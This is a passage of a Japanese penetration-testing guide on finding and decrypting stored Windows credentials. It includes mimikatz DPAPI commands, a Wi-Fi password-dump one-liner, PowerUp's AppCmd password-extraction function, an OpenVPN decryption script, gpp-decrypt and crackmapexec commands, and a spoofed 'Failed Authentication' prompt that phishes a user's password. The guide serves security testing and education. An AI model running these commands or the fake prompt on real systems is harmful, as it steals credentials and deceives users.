DPAPI で暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。`{SID}` はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**同じファイル内にあり、ユーザーの秘密鍵を保護するマスターキーとともに保存される DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD で `dir` コマンドを実行しても内容を一覧表示できませんが、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** の `dpapi::masterkey` を使用すると復号できます。

**master password で保護された credentials files** は通常、次の場所にあります：

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` を適切に指定すれば、**mimikatz モジュール**の `dpapi::cred` を使って復号できます。\
（root 権限があれば）`sekurlsa::dpapi` モジュールを使って、**メモリ**から多数の DPAPI **masterkeys**を**抽出**できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell credentials** は、暗号化された認証情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使用されます。認証情報は **DPAPI** で保護されているため、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた認証情報のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧から該当ファイルが見つかった場合は、`C:\Users` にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを特定してください：[Windows ではプロファイルが別の場所に配置される場合があります](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルが読み取り可能であることは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポート元のユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つかどうかは、別途確認が必要です。通常の調査では、暗号化された値や平文の値を表示せずに、まずパスと ACL を確認してください。

ファイルに保存された PS 認証情報を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg files を復号**します\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから多数の DPAPI masterkeys を**抽出**できます

**mRemoteNG は異なる接続ストアを使用します。** `%APPDATA%\mRemoteNG` およびユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` など、一般的な名前のファイルも対象にします。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによります。広範な列挙中に暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有の管理フォルダーに読み取り可能な状態で存在することがあります。従来形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。パスワード要素が空でない場合は、値を出力したり平文だと決めつけたりせず、認証情報の手がかりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐付けることも、より制約の少ない設定にすることもできます。これを信頼する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Sticky Notes アプリにパスワードなどの情報を保存することがあります。Microsoft のパッケージ版 Sticky Notes アプリは通常、`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にメモを保存します。古いアプリや別のアプリでは、LevelDB など、ほかのユーザープロファイル内のストアを使用することがあります。SQLite ファイルが見つからないことをメモが存在しない証拠とみなす前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたメモが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保持してください。利用可能であれば `plum.sqlite-shm` も含めます。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むメモは、あくまで認証情報の手がかりです。アカウント、許可されたアクセス、およびパスワードの使い回しをそれぞれ別途確認してください。暗号化されたパスワードマネージャーのレコードから、より高い権限のログインが可能だと判断するには、実際の復号キーとアプリ固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity レベルで実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抜粋したものです:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは**SYSTEM 権限で実行されるため**、多くが **DLL Sideloading に対して脆弱です（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Support-tool registry credential artifacts

一部の古いリモートサポート製品では、固定されたアプリケーションのレジストリキーに、パスワード関連の値名が残っています。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` はバージョン 9 より前で設定済みの静的セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。その認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より高い権限を持つ Windows アカウントに至るには、実際にパスワードが再利用されており、そのアカウントの使用が許可されている必要があります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ワークブックにアカウントデータが含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoft によると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけでは、ワークブックの内容が暗号化されているとは言えません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、アカウントの権限が高いことも証明できません。実際のデータと現在のアカウント権限をそれぞれ確認してください。

### CI サーバーに残された変更パッチ

CI サーバーは、ビルド終了後も、送信されたソース変更をデータディレクトリに保持していることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` はリモート実行の変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも `ProgramData` 配下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイルへの参照、暗号化キー、あるいはその両方を使用するスクリプトが残っている場合があります。たとえば、PowerShell の `ConvertTo-SecureString -Key` ワークフローでは、暗号化文字列だけでなく AES キーも必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名だけを確認し、その後、許可を得たうえで関連する内容を調べ、通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、キーへの参照だけでは、有効な認証情報や高い権限でのアクセスは証明できません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自開発のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報を読み取り可能な `.env` ファイル内、またはアップデーターのバイナリの隣に保存していることがあります。アップデーターのスケジュールタスク、アカウント、設定ファイルの ACL、リスナー、データストアの権限をまとめて確認してください。loopback 限定のデータストアでも、有効な認証情報を持つローカルユーザーから到達できますが、認証できるだけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣からアクセス可能な場合は、その暗号化を信用する前に、正確な鍵導出方法を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には適しません。Go のドキュメントでも、このパッケージはセキュリティが重要な用途の乱数生成には不適切とされています。復元したパスワードを権限昇格の経路として扱う前に、それが現在も有効であり、ローカル Administrators グループのアカウントに属することを確認してください。スケジュールタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件はいずれも証明できません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理されたローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra を利用するストレージとアクセス制御は、カスタムのローカルデータストアとは別のものです。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Java サーバープラグインアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されます。読み取り可能なカスタムプラグインには、設定情報や、サービス認証情報を埋め込んだバイトコードが含まれている場合があります。許可を得た場合にのみアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明できません。また、サービスパスワードを復元できても、それがより高い権限を持つアカウントでも有効でなければ、権限昇格にはつながりません。関連ファイルの ACL を確認し、再利用されている認証情報は別々の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)を、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の埋め込みデータベース認証情報

埋め込みデータベースを使用する Openfire のインストールでは、`openfire.script` が `Openfire\embedded-db` に保存されている場合があります。現在のアカウントで読み取り可能な場合は、`OFUSER` レコードと `passwordKey` プロパティを併せて確認してください。Openfire の[ユーザープロバイダードキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存するか、そのプロパティに保持されたキーで暗号化して保存できます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID で現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ調査の手がかりであるため、通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別の `Openfire\conf\openfire.xml` ファイルからは、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェースが分かることがあります。Openfire は通常、管理コンソールを loopback にバインドしますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに到達できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの実行 ID を併せて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスが LocalSystem として実行されている場合、この権限は非常に高いものになり得ます。パスワードが一致することや設定ファイルのパスが読み取り可能なことだけでは、管理コンソールへのアクセスやコード実行は証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### Forensic 管理サーバーの設定

Velociraptor サーバーの設定ファイルは、通常 `server.config.yaml` という名前で、内部 CA の `CA.private_key` を含むことがあります。権限の低いユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。それがより高い権限につながるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントの実行 ID によって異なります。クライアント設定には別の情報が含まれるため、それを見つけてもサーバー CA へのアクセスがあるとは限りません。CA 秘密鍵をオフラインで保管する環境もあるため、読み取り可能なサーバー設定ファイルに署名用キーが含まれていない場合もあります。

Windows サーバーでは、インストールディレクトリにある **サーバー** 設定ファイルと、保護されたバックアップの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。異なる場合は、サービスに設定されたパスを使用してください。現在の ID でファイルを読み取れること、および `CA.private_key` が実際に存在することを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要になることがあります。それらの書き込みができなくても、既存の特権サーバー ID が経路になる場合があります。実行権限を持つ API クエリは、関連するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限で動作することがあります。

サーバー設定ファイルとバックアップは制限的な ACL で保護し、可能であれば CA 署名キーをオフラインで保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)および[セキュリティ設定のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY は独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があります。一方、エクスポートしたセッションのバックアップは `sessions-backup.dat` という名前で、別の場所に保存されている場合があります。[SolarWinds のエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートファイルはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けが含まれることがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。どちらかのファイルを見つけても、そのパスワードが判明するわけではなく、保存された認証情報が今も有効であることや、より高い権限を持つことが証明されるわけでもありません。

### Putty SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSHキー

SSH秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、何か興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、おそらく保存済みの SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)を使えば簡単に復号できます。\
この手法の詳細はこちら：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始したい場合は、次を実行します：

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この technique はもう有効ではないようです。ssh key をいくつか作成し、`ssh-add` で追加して、ssh 経由でマシンにログインしようとしました。レジストリの `HKCU\Software\OpenSSH\Agent\Keys` は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されていることを確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセスできるバックアップまたはイメージのディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検出になりがちです。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPO) は、ドメイン内のすべてのユーザーがアクセスできました。さらに、GPP 内のパスワードは、公開されている既定の鍵を使って AES256 で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。そのため、ユーザーが権限を昇格できる深刻なリスクがありました。

このリスクを軽減するため、空ではない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルを検索する関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP とファイルの場所に関する詳細が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

公開されている webroot に古い ZIP バックアップが直接置かれていると、以前の設定ファイルや再利用可能な認証情報が漏えいするおそれがあります。露出と判断する前に、サイトに設定されている物理パスと、アーカイブが HTTP 経由で実際にアクセス可能かどうかを確認してください。既定の `C:\inetpub\wwwroot` は候補のひとつにすぎません。簡単なローカル調査では、アーカイブを開かずにファイル名とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることや、回収した認証情報でより高い権限を得られることは確認できません。

### OpenVPN認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー本人の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（クライアントに**認証情報**を直接**尋ねる**のは、非常に**危険**であることに注意してください）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが知られているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の使用が可能だとは限りません。保存場所を確認する際は、アクセス可能なユーザープロファイルと設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロック解除には、実際の master-password と、設定されている key-file やアカウント要素が必要です。許可されたレビューでエントリ内に LM:NT hash pair が見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT hash が現在も有効で、対象の NTLM サービスに受け入れられるかを確認してください。vault のエントリだけでは、Administrator または SYSTEM の権限は得られません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行の手順も、すべて満たされている必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

提案されたファイルをすべて検索します:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
